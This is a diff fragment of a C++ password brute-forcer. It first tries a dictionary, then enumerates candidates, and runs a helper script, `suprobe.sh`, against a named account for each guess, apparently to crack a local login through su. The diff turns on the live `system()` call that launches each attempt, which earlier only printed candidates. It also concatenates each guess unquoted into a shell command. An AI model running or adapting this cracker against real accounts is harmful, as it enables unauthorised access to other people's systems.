@@ -47,7 +47,7 @@ long long string_to_int(string s){
     return sum;
 }
 
-string int_to_string(long long l){
+/*string int_to_string(long long l){
     string s = "";
     for(int i = 1; l > 0; i++){
         char c = vctoi[(l%((long long)(pow(vctoi.size(),i))))];
@@ -56,6 +56,14 @@ string int_to_string(long long l){
     }
     reverse(s.begin(), s.end());
     return s;
+}*/
+
+string int_to_string(string s, long long n) {
+    if (n < vctoi.size()) {
+        return s+=vctoi[n];
+    } else {
+        return int_to_string(s+=vctoi[n%vctoi.size()], n/vctoi.size());
+    }
 }
 
 int main(int argc, char **argv){
@@ -144,12 +152,12 @@ int main(int argc, char **argv){
         system(cmd.c_str());
     }
     //If we make it this far, password was not in dict;
-    for(long long i = 0; i < 10000000000; i++){ //If we try long enough, give up
+    for(long long i = 0; i < 10000000000; i++){ //If we try long enough, give up. To speed up the process to get to "1234", start i at 964900
         //Test Password
-        pwd=int_to_string(i);
+        pwd=int_to_string("", i);
         const string cmd = "bash suprobe.sh " + pwd + ' ' + USERNAME + ' ' + to_string(getpid()) + ">/dev/null 2>/dev/null &";
-        //system(cmd.c_str());
-        cout << pwd << endl;
+        system(cmd.c_str());
+        if(i%10==0) cout << pwd << endl;
         //Attempt to keep procs under PROC_CAP
         while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
             //cout << mem_left() << endl;
